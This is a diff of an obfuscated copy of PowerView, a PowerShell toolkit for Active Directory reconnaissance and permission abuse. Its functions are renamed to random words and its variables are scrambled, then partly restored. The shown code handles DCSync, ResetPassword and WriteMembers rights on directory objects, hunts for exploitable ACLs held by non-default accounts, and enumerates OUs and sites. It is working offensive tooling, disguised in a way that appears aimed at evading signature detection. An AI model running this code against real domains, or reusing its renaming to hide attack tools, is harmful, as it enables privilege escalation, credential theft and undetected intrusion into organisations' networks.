-        if ($PSBoundParameters['SearchScope']) { $hBSkMWAr99['SearchScope'] = $vaSWXjPs99 }
-        if ($PSBoundParameters['ResultPageSize']) { $hBSkMWAr99['ResultPageSize'] = $mhcqrrQn99 }
-        if ($PSBoundParameters['ServerTimeLimit']) { $hBSkMWAr99['ServerTimeLimit'] = $mvTbAWDU99 }
-        if ($PSBoundParameters['Tombstone']) { $hBSkMWAr99['Tombstone'] = $rPozaKft99 }
-        if ($PSBoundParameters['Credential']) { $hBSkMWAr99['Credential'] = $gxazvivN99 }
-        $sOpNNZru99 = farrowing @PrincipalSearcherArguments
-        if (-not $sOpNNZru99) {
-            throw "Unable to resolve principal: $yhJclZId99"
+        if ($PSBoundParameters['PrincipalDomain']) { $PrincipalSearcherArguments['Domain'] = $PrincipalDomain }
+        if ($PSBoundParameters['Server']) { $PrincipalSearcherArguments['Server'] = $Server }
+        if ($PSBoundParameters['SearchScope']) { $PrincipalSearcherArguments['SearchScope'] = $SearchScope }
+        if ($PSBoundParameters['ResultPageSize']) { $PrincipalSearcherArguments['ResultPageSize'] = $ResultPageSize }
+        if ($PSBoundParameters['ServerTimeLimit']) { $PrincipalSearcherArguments['ServerTimeLimit'] = $ServerTimeLimit }
+        if ($PSBoundParameters['Tombstone']) { $PrincipalSearcherArguments['Tombstone'] = $Tombstone }
+        if ($PSBoundParameters['Credential']) { $PrincipalSearcherArguments['Credential'] = $Credential }
+        $Principals = dermatitis @PrincipalSearcherArguments
+        if (-not $Principals) {
+            throw "Unable to resolve principal: $PrincipalIdentity"
         }
     }
     PROCESS {
-        $MLmKnjod99['Identity'] = $ImYRLJwd99
-        $khNNPamj99 = farrowing @TargetSearcherArguments
-        ForEach ($UAGfwAnC99 in $khNNPamj99) {
-            $ARVPipoY99 = [System.DirectoryServices.ActiveDirectorySecurityInheritance] 'None'
-            $CWTmfuAd99 = [System.Security.AccessControl.AccessControlType] 'Allow'
+        $TargetSearcherArguments['Identity'] = $TargetIdentity
+        $Targets = dermatitis @TargetSearcherArguments
+        ForEach ($TargetObject in $Targets) {
+            $InheritanceType = [System.DirectoryServices.ActiveDirectorySecurityInheritance] 'None'
+            $ControlType = [System.Security.AccessControl.AccessControlType] 'Allow'
             $ACEs = @()
-            if ($ttBmZLHk99) {
-                $GUIDs = @($ttBmZLHk99)
+            if ($RightsGUID) {
+                $GUIDs = @($RightsGUID)
             }
             else {
-                $GUIDs = Switch ($uDyzYPFx99) {
+                $GUIDs = Switch ($Rights) {
                     'ResetPassword' { '00299570-246d-11d0-a768-00aa006e0529' }
                     'WriteMembers' { 'bf9679c0-0de6-11d0-a285-00aa003049e2' }
                     'DCSync' { '1131f6aa-9c07-11d1-f79f-00c04fc2dcd2', '1131f6ad-9c07-11d1-f79f-00c04fc2dcd2', '89e95b76-444d-4c62-991a-0facbeda640c'}
                 }
             }
-            ForEach ($VSoDkQsP99 in $sOpNNZru99) {
-                Write-Verbose "[cheapens] Removing principal $($VSoDkQsP99.distinguishedname) '$uDyzYPFx99' from $($UAGfwAnC99.Properties.distinguishedname)"
+            ForEach ($PrincipalObject in $Principals) {
+                Write-Verbose "[citric] Removing principal $($PrincipalObject.distinguishedname) '$Rights' from $($TargetObject.Properties.distinguishedname)"
                 try {
-                    $BfpbWwpi99 = [System.Security.Principal.IdentityReference] ([System.Security.Principal.SecurityIdentifier]$VSoDkQsP99.objectsid)
+                    $Identity = [System.Security.Principal.IdentityReference] ([System.Security.Principal.SecurityIdentifier]$PrincipalObject.objectsid)
                     if ($GUIDs) {
                         ForEach ($GUID in $GUIDs) {
-                            $NQyWORBy99 = New-Object Guid $GUID
-                            $TiyiOPYY99 = [System.DirectoryServices.ActiveDirectoryRights] 'ExtendedRight'
-                            $ACEs += New-Object System.DirectoryServices.ActiveDirectoryAccessRule $BfpbWwpi99, $TiyiOPYY99, $CWTmfuAd99, $NQyWORBy99, $ARVPipoY99
+                            $NewGUID = New-Object Guid $GUID
+                            $ADRights = [System.DirectoryServices.ActiveDirectoryRights] 'ExtendedRight'
+                            $ACEs += New-Object System.DirectoryServices.ActiveDirectoryAccessRule $Identity, $ADRights, $ControlType, $NewGUID, $InheritanceType
                         }
                     }
                     else {
-                        $TiyiOPYY99 = [System.DirectoryServices.ActiveDirectoryRights] 'GenericAll'
-                        $ACEs += New-Object System.DirectoryServices.ActiveDirectoryAccessRule $BfpbWwpi99, $TiyiOPYY99, $CWTmfuAd99, $ARVPipoY99
+                        $ADRights = [System.DirectoryServices.ActiveDirectoryRights] 'GenericAll'
+                        $ACEs += New-Object System.DirectoryServices.ActiveDirectoryAccessRule $Identity, $ADRights, $ControlType, $InheritanceType
                     }
                     ForEach ($ACE in $ACEs) {
-                        Write-Verbose "[cheapens] Granting principal $($VSoDkQsP99.distinguishedname) rights GUID '$($ACE.ObjectType)' on $($UAGfwAnC99.Properties.distinguishedname)"
-                        $jLkGSgjF99 = $UAGfwAnC99.GetDirectoryEntry()
-                        $jLkGSgjF99.PsBase.Options.SecurityMasks = 'Dacl'
-                        $jLkGSgjF99.PsBase.ObjectSecurity.RemoveAccessRule($ACE)
-                        $jLkGSgjF99.PsBase.CommitChanges()
+                        Write-Verbose "[citric] Granting principal $($PrincipalObject.distinguishedname) rights GUID '$($ACE.ObjectType)' on $($TargetObject.Properties.distinguishedname)"
+                        $TargetEntry = $TargetObject.GetDirectoryEntry()
+                        $TargetEntry.PsBase.Options.SecurityMasks = 'Dacl'
+                        $TargetEntry.PsBase.ObjectSecurity.RemoveAccessRule($ACE)
+                        $TargetEntry.PsBase.CommitChanges()
                     }
                 }
                 catch {
-                    Write-Verbose "[cheapens] Error removing principal $($VSoDkQsP99.distinguishedname) '$uDyzYPFx99' from $($UAGfwAnC99.Properties.distinguishedname) : $_"
+                    Write-Verbose "[citric] Error removing principal $($PrincipalObject.distinguishedname) '$Rights' from $($TargetObject.Properties.distinguishedname) : $_"
                 }
             }
         }
     }
 }
-function voile {
+function Broadway {
     [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
     [OutputType('PowerView.ACL')]
     [CmdletBinding()]
@@ -4253,141 +4253,141 @@ function voile {
         [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
         [Alias('DomainName', 'Name')]
         [String]
-        $SSNUOPgW99,
+        $Domain,
         [Switch]
-        $wZrotwTh99,
+        $ResolveGUIDs,
         [String]
         [ValidateSet('All', 'ResetPassword', 'WriteMembers')]
-        $weQLqZWd99,
+        $RightsFilter,
         [ValidateNotNullOrEmpty()]
         [Alias('Filter')]
         [String]
-        $HOOTOEqu99,
+        $LDAPFilter,
         [ValidateNotNullOrEmpty()]
         [Alias('ADSPath')]
         [String]
-        $FNgTGwmR99,
+        $SearchBase,
         [ValidateNotNullOrEmpty()]
         [Alias('DomainController')]
         [String]
-        $mSxqoOjK99,
+        $Server,
         [ValidateSet('Base', 'OneLevel', 'Subtree')]
         [String]
-        $vaSWXjPs99 = 'Subtree',
+        $SearchScope = 'Subtree',
         [ValidateRange(1, 10000)]
         [Int]
-        $mhcqrrQn99 = 200,
+        $ResultPageSize = 200,
         [ValidateRange(1, 10000)]
         [Int]
-        $mvTbAWDU99,
+        $ServerTimeLimit,
         [Switch]
-        $rPozaKft99,
+        $Tombstone,
         [Management.Automation.PSCredential]
         [Management.Automation.CredentialAttribute()]
-        $gxazvivN99 = [Management.Automation.PSCredential]::Empty
+        $Credential = [Management.Automation.PSCredential]::Empty
     )
     BEGIN {
-        $WGnEEzJx99 = @{}
-        if ($PSBoundParameters['ResolveGUIDs']) { $WGnEEzJx99['ResolveGUIDs'] = $wZrotwTh99 }
-        if ($PSBoundParameters['RightsFilter']) { $WGnEEzJx99['RightsFilter'] = $weQLqZWd99 }
-        if ($PSBoundParameters['LDAPFilter']) { $WGnEEzJx99['LDAPFilter'] = $HOOTOEqu99 }
-        if ($PSBoundParameters['SearchBase']) { $WGnEEzJx99['SearchBase'] = $FNgTGwmR99 }
-        if ($PSBoundParameters['Server']) { $WGnEEzJx99['Server'] = $mSxqoOjK99 }
-        if ($PSBoundParameters['SearchScope']) { $WGnEEzJx99['SearchScope'] = $vaSWXjPs99 }
-        if ($PSBoundParameters['ResultPageSize']) { $WGnEEzJx99['ResultPageSize'] = $mhcqrrQn99 }
-        if ($PSBoundParameters['ServerTimeLimit']) { $WGnEEzJx99['ServerTimeLimit'] = $mvTbAWDU99 }
-        if ($PSBoundParameters['Tombstone']) { $WGnEEzJx99['Tombstone'] = $rPozaKft99 }
-        if ($PSBoundParameters['Credential']) { $WGnEEzJx99['Credential'] = $gxazvivN99 }
-        $VmkJyBhe99 = @{
+        $ACLArguments = @{}
+        if ($PSBoundParameters['ResolveGUIDs']) { $ACLArguments['ResolveGUIDs'] = $ResolveGUIDs }
+        if ($PSBoundParameters['RightsFilter']) { $ACLArguments['RightsFilter'] = $RightsFilter }
+        if ($PSBoundParameters['LDAPFilter']) { $ACLArguments['LDAPFilter'] = $LDAPFilter }
+        if ($PSBoundParameters['SearchBase']) { $ACLArguments['SearchBase'] = $SearchBase }
+        if ($PSBoundParameters['Server']) { $ACLArguments['Server'] = $Server }
+        if ($PSBoundParameters['SearchScope']) { $ACLArguments['SearchScope'] = $SearchScope }
+        if ($PSBoundParameters['ResultPageSize']) { $ACLArguments['ResultPageSize'] = $ResultPageSize }
+        if ($PSBoundParameters['ServerTimeLimit']) { $ACLArguments['ServerTimeLimit'] = $ServerTimeLimit }
+        if ($PSBoundParameters['Tombstone']) { $ACLArguments['Tombstone'] = $Tombstone }
+        if ($PSBoundParameters['Credential']) { $ACLArguments['Credential'] = $Credential }
+        $ObjectSearcherArguments = @{
             'Properties' = 'samaccountname,objectclass'
             'Raw' = $True
         }
-        if ($PSBoundParameters['Server']) { $VmkJyBhe99['Server'] = $mSxqoOjK99 }
-        if ($PSBoundParameters['SearchScope']) { $VmkJyBhe99['SearchScope'] = $vaSWXjPs99 }
-        if ($PSBoundParameters['ResultPageSize']) { $VmkJyBhe99['ResultPageSize'] = $mhcqrrQn99 }
-        if ($PSBoundParameters['ServerTimeLimit']) { $VmkJyBhe99['ServerTimeLimit'] = $mvTbAWDU99 }
-        if ($PSBoundParameters['Tombstone']) { $VmkJyBhe99['Tombstone'] = $rPozaKft99 }
-        if ($PSBoundParameters['Credential']) { $VmkJyBhe99['Credential'] = $gxazvivN99 }
-        $GnxtbMaP99 = @{}
-        if ($PSBoundParameters['Server']) { $GnxtbMaP99['Server'] = $mSxqoOjK99 }
-        if ($PSBoundParameters['Credential']) { $GnxtbMaP99['Credential'] = $gxazvivN99 }
-        $xToCksFH99 = @{}
+        if ($PSBoundParameters['Server']) { $ObjectSearcherArguments['Server'] = $Server }
+        if ($PSBoundParameters['SearchScope']) { $ObjectSearcherArguments['SearchScope'] = $SearchScope }
+        if ($PSBoundParameters['ResultPageSize']) { $ObjectSearcherArguments['ResultPageSize'] = $ResultPageSize }
+        if ($PSBoundParameters['ServerTimeLimit']) { $ObjectSearcherArguments['ServerTimeLimit'] = $ServerTimeLimit }
+        if ($PSBoundParameters['Tombstone']) { $ObjectSearcherArguments['Tombstone'] = $Tombstone }
+        if ($PSBoundParameters['Credential']) { $ObjectSearcherArguments['Credential'] = $Credential }
+        $ADNameArguments = @{}
+        if ($PSBoundParameters['Server']) { $ADNameArguments['Server'] = $Server }
+        if ($PSBoundParameters['Credential']) { $ADNameArguments['Credential'] = $Credential }
+        $ResolvedSIDs = @{}
     }
     PROCESS {
         if ($PSBoundParameters['Domain']) {
-            $WGnEEzJx99['Domain'] = $SSNUOPgW99
-            $GnxtbMaP99['Domain'] = $SSNUOPgW99
+            $ACLArguments['Domain'] = $Domain
+            $ADNameArguments['Domain'] = $Domain
         }
-        pols @ACLArguments | ForEach-Object {
+        Pearl @ACLArguments | ForEach-Object {
             if ( ($_.ActiveDirectoryRights -match 'GenericAll|Write|Create|Delete') -or (($_.ActiveDirectoryRights -match 'ExtendedRight') -and ($_.AceQualifier -match 'Allow'))) {
                 if ($_.SecurityIdentifier.Value -match '^S-1-5-.*-[1-9]\d{3,}$') {
-                    if ($xToCksFH99[$_.SecurityIdentifier.Value]) {
-                        $vuOViPzg99, $AVCaQWcv99, $viRLpUZY99, $zJuoKMSR99 = $xToCksFH99[$_.SecurityIdentifier.Value]
-                        $aqAiPrDf99 = New-Object PSObject
-                        $aqAiPrDf99 | Add-Member NoteProperty 'ObjectDN' $_.ObjectDN
-                        $aqAiPrDf99 | Add-Member NoteProperty 'AceQualifier' $_.AceQualifier
-                        $aqAiPrDf99 | Add-Member NoteProperty 'ActiveDirectoryRights' $_.ActiveDirectoryRights
+                    if ($ResolvedSIDs[$_.SecurityIdentifier.Value]) {
+                        $IdentityReferenceName, $IdentityReferenceDomain, $IdentityReferenceDN, $IdentityReferenceClass = $ResolvedSIDs[$_.SecurityIdentifier.Value]
+                        $InterestingACL = New-Object PSObject
+                        $InterestingACL | Add-Member NoteProperty 'ObjectDN' $_.ObjectDN
+                        $InterestingACL | Add-Member NoteProperty 'AceQualifier' $_.AceQualifier
+                        $InterestingACL | Add-Member NoteProperty 'ActiveDirectoryRights' $_.ActiveDirectoryRights
                         if ($_.ObjectAceType) {
-                            $aqAiPrDf99 | Add-Member NoteProperty 'ObjectAceType' $_.ObjectAceType
+                            $InterestingACL | Add-Member NoteProperty 'ObjectAceType' $_.ObjectAceType
                         }
                         else {
-                            $aqAiPrDf99 | Add-Member NoteProperty 'ObjectAceType' 'None'
+                            $InterestingACL | Add-Member NoteProperty 'ObjectAceType' 'None'
                         }
-                        $aqAiPrDf99 | Add-Member NoteProperty 'AceFlags' $_.AceFlags
-                        $aqAiPrDf99 | Add-Member NoteProperty 'AceType' $_.AceType
-                        $aqAiPrDf99 | Add-Member NoteProperty 'InheritanceFlags' $_.InheritanceFlags
-                        $aqAiPrDf99 | Add-Member NoteProperty 'SecurityIdentifier' $_.SecurityIdentifier
-                        $aqAiPrDf99 | Add-Member NoteProperty 'IdentityReferenceName' $vuOViPzg99
-                        $aqAiPrDf99 | Add-Member NoteProperty 'IdentityReferenceDomain' $AVCaQWcv99
-                        $aqAiPrDf99 | Add-Member NoteProperty 'IdentityReferenceDN' $viRLpUZY99
-                        $aqAiPrDf99 | Add-Member NoteProperty 'IdentityReferenceClass' $zJuoKMSR99
-                        $aqAiPrDf99
+                        $InterestingACL | Add-Member NoteProperty 'AceFlags' $_.AceFlags
+                        $InterestingACL | Add-Member NoteProperty 'AceType' $_.AceType
+                        $InterestingACL | Add-Member NoteProperty 'InheritanceFlags' $_.InheritanceFlags
+                        $InterestingACL | Add-Member NoteProperty 'SecurityIdentifier' $_.SecurityIdentifier
+                        $InterestingACL | Add-Member NoteProperty 'IdentityReferenceName' $IdentityReferenceName
+                        $InterestingACL | Add-Member NoteProperty 'IdentityReferenceDomain' $IdentityReferenceDomain
+                        $InterestingACL | Add-Member NoteProperty 'IdentityReferenceDN' $IdentityReferenceDN
+                        $InterestingACL | Add-Member NoteProperty 'IdentityReferenceClass' $IdentityReferenceClass
+                        $InterestingACL
                     }
                     else {
-                        $viRLpUZY99 = kinsman -Identity $_.SecurityIdentifier.Value -OutputType DN @ADNameArguments
-                        if ($viRLpUZY99) {
-                            $AVCaQWcv99 = $viRLpUZY99.SubString($viRLpUZY99.IndexOf('DC=')) -replace 'DC=','' -replace ',','.'
-                            $VmkJyBhe99['Domain'] = $AVCaQWcv99
-                            $VmkJyBhe99['Identity'] = $viRLpUZY99
-                            $Object = farrowing @ObjectSearcherArguments
+                        $IdentityReferenceDN = corralling -Identity $_.SecurityIdentifier.Value -OutputType DN @ADNameArguments
+                        if ($IdentityReferenceDN) {
+                            $IdentityReferenceDomain = $IdentityReferenceDN.SubString($IdentityReferenceDN.IndexOf('DC=')) -replace 'DC=','' -replace ',','.'
+                            $ObjectSearcherArguments['Domain'] = $IdentityReferenceDomain
+                            $ObjectSearcherArguments['Identity'] = $IdentityReferenceDN
+                            $Object = dermatitis @ObjectSearcherArguments
                             if ($Object) {
-                                $vuOViPzg99 = $Object.Properties.samaccountname[0]
+                                $IdentityReferenceName = $Object.Properties.samaccountname[0]
                                 if ($Object.Properties.objectclass -match 'computer') {
-                                    $zJuoKMSR99 = 'computer'
+                                    $IdentityReferenceClass = 'computer'
                                 }
                                 elseif ($Object.Properties.objectclass -match 'group') {
-                                    $zJuoKMSR99 = 'group'
+                                    $IdentityReferenceClass = 'group'
                                 }
                                 elseif ($Object.Properties.objectclass -match 'user') {
-                                    $zJuoKMSR99 = 'user'
+                                    $IdentityReferenceClass = 'user'
                                 }
                                 else {
-                                    $zJuoKMSR99 = $Null
+                                    $IdentityReferenceClass = $Null
                                 }
-                                $xToCksFH99[$_.SecurityIdentifier.Value] = $vuOViPzg99, $AVCaQWcv99, $viRLpUZY99, $zJuoKMSR99
-                                $aqAiPrDf99 = New-Object PSObject
-                                $aqAiPrDf99 | Add-Member NoteProperty 'ObjectDN' $_.ObjectDN
-                                $aqAiPrDf99 | Add-Member NoteProperty 'AceQualifier' $_.AceQualifier
-                                $aqAiPrDf99 | Add-Member NoteProperty 'ActiveDirectoryRights' $_.ActiveDirectoryRights
+                                $ResolvedSIDs[$_.SecurityIdentifier.Value] = $IdentityReferenceName, $IdentityReferenceDomain, $IdentityReferenceDN, $IdentityReferenceClass
+                                $InterestingACL = New-Object PSObject
+                                $InterestingACL | Add-Member NoteProperty 'ObjectDN' $_.ObjectDN
+                                $InterestingACL | Add-Member NoteProperty 'AceQualifier' $_.AceQualifier
+                                $InterestingACL | Add-Member NoteProperty 'ActiveDirectoryRights' $_.ActiveDirectoryRights
                                 if ($_.ObjectAceType) {
-                                    $aqAiPrDf99 | Add-Member NoteProperty 'ObjectAceType' $_.ObjectAceType
+                                    $InterestingACL | Add-Member NoteProperty 'ObjectAceType' $_.ObjectAceType
                                 }
                                 else {
-                                    $aqAiPrDf99 | Add-Member NoteProperty 'ObjectAceType' 'None'
+                                    $InterestingACL | Add-Member NoteProperty 'ObjectAceType' 'None'
                                 }
-                                $aqAiPrDf99 | Add-Member NoteProperty 'AceFlags' $_.AceFlags
-                                $aqAiPrDf99 | Add-Member NoteProperty 'AceType' $_.AceType
-                                $aqAiPrDf99 | Add-Member NoteProperty 'InheritanceFlags' $_.InheritanceFlags
-                                $aqAiPrDf99 | Add-Member NoteProperty 'SecurityIdentifier' $_.SecurityIdentifier
-                                $aqAiPrDf99 | Add-Member NoteProperty 'IdentityReferenceName' $vuOViPzg99
-                                $aqAiPrDf99 | Add-Member NoteProperty 'IdentityReferenceDomain' $AVCaQWcv99
-                                $aqAiPrDf99 | Add-Member NoteProperty 'IdentityReferenceDN' $viRLpUZY99
-                                $aqAiPrDf99 | Add-Member NoteProperty 'IdentityReferenceClass' $zJuoKMSR99
-                                $aqAiPrDf99
+                                $InterestingACL | Add-Member NoteProperty 'AceFlags' $_.AceFlags
+                                $InterestingACL | Add-Member NoteProperty 'AceType' $_.AceType
+                                $InterestingACL | Add-Member NoteProperty 'InheritanceFlags' $_.InheritanceFlags
+                                $InterestingACL | Add-Member NoteProperty 'SecurityIdentifier' $_.SecurityIdentifier
+                                $InterestingACL | Add-Member NoteProperty 'IdentityReferenceName' $IdentityReferenceName
+                                $InterestingACL | Add-Member NoteProperty 'IdentityReferenceDomain' $IdentityReferenceDomain
+                                $InterestingACL | Add-Member NoteProperty 'IdentityReferenceDN' $IdentityReferenceDN
+                                $InterestingACL | Add-Member NoteProperty 'IdentityReferenceClass' $IdentityReferenceClass
+                                $InterestingACL
                             }
                         }
                         else {
-                            Write-Warning "[voile] Unable to convert SID '$($_.SecurityIdentifier.Value )' to a distinguishedname with kinsman"
+                            Write-Warning "[Broadway] Unable to convert SID '$($_.SecurityIdentifier.Value )' to a distinguishedname with corralling"
                         }
                     }
                 }
@@ -4395,7 +4395,7 @@ function voile {
         }
     }
 }
-function ivies {
+function vaporizes {
     [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
     [OutputType('PowerView.OU')]
     [CmdletBinding()]
@@ -4403,130 +4403,130 @@ function ivies {
         [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
         [Alias('Name')]
         [String[]]
-        $BfpbWwpi99,
+        $Identity,
         [ValidateNotNullOrEmpty()]
         [String]
         [Alias('GUID')]
-        $OyouMTgX99,
+        $GPLink,
         [ValidateNotNullOrEmpty()]
         [String]
-        $SSNUOPgW99,
+        $Domain,
         [ValidateNotNullOrEmpty()]
         [Alias('Filter')]
         [String]
-        $HOOTOEqu99,
+        $LDAPFilter,
         [ValidateNotNullOrEmpty()]
         [String[]]
-        $SdzJuWMG99,
+        $Properties,
         [ValidateNotNullOrEmpty()]
         [Alias('ADSPath')]
         [String]
-        $FNgTGwmR99,
+        $SearchBase,
         [ValidateNotNullOrEmpty()]
         [Alias('DomainController')]
         [String]
-        $mSxqoOjK99,
+        $Server,
         [ValidateSet('Base', 'OneLevel', 'Subtree')]
         [String]
-        $vaSWXjPs99 = 'Subtree',
+        $SearchScope = 'Subtree',
         [ValidateRange(1, 10000)]
         [Int]
-        $mhcqrrQn99 = 200,
+        $ResultPageSize = 200,
         [ValidateRange(1, 10000)]
         [Int]
-        $mvTbAWDU99,
+        $ServerTimeLimit,
         [ValidateSet('Dacl', 'Group', 'None', 'Owner', 'Sacl')]
         [String]
-        $tmZARvdq99,
+        $SecurityMasks,
         [Switch]
-        $rPozaKft99,
+        $Tombstone,
         [Alias('ReturnOne')]
         [Switch]
-        $QtcSidjx99,
+        $FindOne,
         [Management.Automation.PSCredential]
         [Management.Automation.CredentialAttribute()]
-        $gxazvivN99 = [Management.Automation.PSCredential]::Empty,
+        $Credential = [Management.Automation.PSCredential]::Empty,
         [Switch]
         $Raw
     )
     BEGIN {
-        $PPosolen99 = @{}
-        if ($PSBoundParameters['Domain']) { $PPosolen99['Domain'] = $SSNUOPgW99 }
-        if ($PSBoundParameters['Properties']) { $PPosolen99['Properties'] = $SdzJuWMG99 }
-        if ($PSBoundParameters['SearchBase']) { $PPosolen99['SearchBase'] = $FNgTGwmR99 }
-        if ($PSBoundParameters['Server']) { $PPosolen99['Server'] = $mSxqoOjK99 }
-        if ($PSBoundParameters['SearchScope']) { $PPosolen99['SearchScope'] = $vaSWXjPs99 }
-        if ($PSBoundParameters['ResultPageSize']) { $PPosolen99['ResultPageSize'] = $mhcqrrQn99 }
-        if ($PSBoundParameters['ServerTimeLimit']) { $PPosolen99['ServerTimeLimit'] = $mvTbAWDU99 }
-        if ($PSBoundParameters['SecurityMasks']) { $PPosolen99['SecurityMasks'] = $tmZARvdq99 }
-        if ($PSBoundParameters['Tombstone']) { $PPosolen99['Tombstone'] = $rPozaKft99 }
-        if ($PSBoundParameters['Credential']) { $PPosolen99['Credential'] = $gxazvivN99 }
-        $AUTDYHIn99 = watersides @SearcherArguments
+        $SearcherArguments = @{}
+        if ($PSBoundParameters['Domain']) { $SearcherArguments['Domain'] = $Domain }
+        if ($PSBoundParameters['Properties']) { $SearcherArguments['Properties'] = $Properties }
+        if ($PSBoundParameters['SearchBase']) { $SearcherArguments['SearchBase'] = $SearchBase }
+        if ($PSBoundParameters['Server']) { $SearcherArguments['Server'] = $Server }
+        if ($PSBoundParameters['SearchScope']) { $SearcherArguments['SearchScope'] = $SearchScope }
+        if ($PSBoundParameters['ResultPageSize']) { $SearcherArguments['ResultPageSize'] = $ResultPageSize }
+        if ($PSBoundParameters['ServerTimeLimit']) { $SearcherArguments['ServerTimeLimit'] = $ServerTimeLimit }
+        if ($PSBoundParameters['SecurityMasks']) { $SearcherArguments['SecurityMasks'] = $SecurityMasks }
+        if ($PSBoundParameters['Tombstone']) { $SearcherArguments['Tombstone'] = $Tombstone }
+        if ($PSBoundParameters['Credential']) { $SearcherArguments['Credential'] = $Credential }
+        $OUSearcher = deadly @SearcherArguments
     }
     PROCESS {
-        if ($AUTDYHIn99) {
-            $afFJXkRc99 = ''
-            $kXbEpVCq99 = ''
-            $BfpbWwpi99 | Where-Object {$_} | ForEach-Object {
-                $QghnbJOP99 = $_.Replace('(', '\28').Replace(')', '\29')
-                if ($QghnbJOP99 -match '^OU=.*') {
-                    $afFJXkRc99 += "(distinguishedname=$QghnbJOP99)"
+        if ($OUSearcher) {
+            $IdentityFilter = ''
+            $Filter = ''
+            $Identity | Where-Object {$_} | ForEach-Object {
+                $IdentityInstance = $_.Replace('(', '\28').Replace(')', '\29')
+                if ($IdentityInstance -match '^OU=.*') {
+                    $IdentityFilter += "(distinguishedname=$IdentityInstance)"
                     if ((-not $PSBoundParameters['Domain']) -and (-not $PSBoundParameters['SearchBase'])) {
-                        $BvhyhWZG99 = $QghnbJOP99.SubString($QghnbJOP99.IndexOf('DC=')) -replace 'DC=','' -replace ',','.'
-                        Write-Verbose "[ivies] Extracted domain '$BvhyhWZG99' from '$QghnbJOP99'"
-                        $PPosolen99['Domain'] = $BvhyhWZG99
-                        $AUTDYHIn99 = watersides @SearcherArguments
-                        if (-not $AUTDYHIn99) {
-                            Write-Warning "[ivies] Unable to retrieve domain searcher for '$BvhyhWZG99'"
+                        $IdentityDomain = $IdentityInstance.SubString($IdentityInstance.IndexOf('DC=')) -replace 'DC=','' -replace ',','.'
+                        Write-Verbose "[vaporizes] Extracted domain '$IdentityDomain' from '$IdentityInstance'"
+                        $SearcherArguments['Domain'] = $IdentityDomain
+                        $OUSearcher = deadly @SearcherArguments
+                        if (-not $OUSearcher) {
+                            Write-Warning "[vaporizes] Unable to retrieve domain searcher for '$IdentityDomain'"
                         }
                     }
                 }
                 else {
                     try {
-                        $DwsqqDxI99 = (-Join (([Guid]$QghnbJOP99).ToByteArray() | ForEach-Object {$_.ToString('X').PadLeft(2,'0')})) -Replace '(..)','\$1'
-                        $afFJXkRc99 += "(objectguid=$DwsqqDxI99)"
+                        $GuidByteString = (-Join (([Guid]$IdentityInstance).ToByteArray() | ForEach-Object {$_.ToString('X').PadLeft(2,'0')})) -Replace '(..)','\$1'
+                        $IdentityFilter += "(objectguid=$GuidByteString)"
                     }
                     catch {
-                        $afFJXkRc99 += "(name=$QghnbJOP99)"
+                        $IdentityFilter += "(name=$IdentityInstance)"
                     }
                 }
             }
-            if ($afFJXkRc99 -and ($afFJXkRc99.Trim() -ne '') ) {
-                $kXbEpVCq99 += "(|$afFJXkRc99)"
+            if ($IdentityFilter -and ($IdentityFilter.Trim() -ne '') ) {
+                $Filter += "(|$IdentityFilter)"
             }
             if ($PSBoundParameters['GPLink']) {
-                Write-Verbose "[ivies] Searching for OUs with $OyouMTgX99 set in the gpLink property"
-                $kXbEpVCq99 += "(gplink=*$OyouMTgX99*)"
+                Write-Verbose "[vaporizes] Searching for OUs with $GPLink set in the gpLink property"
+                $Filter += "(gplink=*$GPLink*)"
             }
             if ($PSBoundParameters['LDAPFilter']) {
-                Write-Verbose "[ivies] Using additional LDAP filter: $HOOTOEqu99"
-                $kXbEpVCq99 += "$HOOTOEqu99"
+                Write-Verbose "[vaporizes] Using additional LDAP filter: $LDAPFilter"
+                $Filter += "$LDAPFilter"
             }
-            $AUTDYHIn99.filter = "(&(objectCategory=organizationalUnit)$kXbEpVCq99)"
-            Write-Verbose "[ivies] ivies filter string: $($AUTDYHIn99.filter)"
-            if ($PSBoundParameters['FindOne']) { $pfqXXMQd99 = $AUTDYHIn99.FindOne() }
-            else { $pfqXXMQd99 = $AUTDYHIn99.FindAll() }
-            $pfqXXMQd99 | Where-Object {$_} | ForEach-Object {
+            $OUSearcher.filter = "(&(objectCategory=organizationalUnit)$Filter)"
+            Write-Verbose "[vaporizes] vaporizes filter string: $($OUSearcher.filter)"
+            if ($PSBoundParameters['FindOne']) { $Results = $OUSearcher.FindOne() }
+            else { $Results = $OUSearcher.FindAll() }
+            $Results | Where-Object {$_} | ForEach-Object {
                 if ($PSBoundParameters['Raw']) {
                     $OU = $_
                 }
                 else {
-                    $OU = Buddy -Properties $_.Properties
+                    $OU = bookie -Properties $_.Properties
                 }
                 $OU.PSObject.TypeNames.Insert(0, 'PowerView.OU')
                 $OU
             }
-            if ($pfqXXMQd99) {
-                try { $pfqXXMQd99.dispose() }
+            if ($Results) {
+                try { $Results.dispose() }
                 catch {
-                    Write-Verbose "[ivies] Error disposing of the Results object: $_"
+                    Write-Verbose "[vaporizes] Error disposing of the Results object: $_"
                 }
             }
-            $AUTDYHIn99.dispose()
+            $OUSearcher.dispose()
         }
     }
 }
-function shoddiness {
+function our {
     [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
     [OutputType('PowerView.Site')]
     [CmdletBinding()]
@@ -4534,132 +4534,132 @@ function shoddiness {
         [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
         [Alias('Name')]
         [String[]]
-        $BfpbWwpi99,
+        $Identity,
         [ValidateNotNullOrEmpty()]
         [String]
         [Alias('GUID')]
-        $OyouMTgX99,
+        $GPLink,
         [ValidateNotNullOrEmpty()]
         [String]
-        $SSNUOPgW99,
+        $Domain,
         [ValidateNotNullOrEmpty()]
         [Alias('Filter')]
         [String]
-        $HOOTOEqu99,
+        $LDAPFilter,
         [ValidateNotNullOrEmpty()]
         [String[]]
-        $SdzJuWMG99,
+        $Properties,
         [ValidateNotNullOrEmpty()]
         [Alias('ADSPath')]
         [String]
-        $FNgTGwmR99,
+        $SearchBase,
         [ValidateNotNullOrEmpty()]
         [Alias('DomainController')]
         [String]
-        $mSxqoOjK99,
+        $Server,
         [ValidateSet('Base', 'OneLevel', 'Subtree')]
         [String]
-        $vaSWXjPs99 = 'Subtree',
+        $SearchScope = 'Subtree',
         [ValidateRange(1, 10000)]
         [Int]
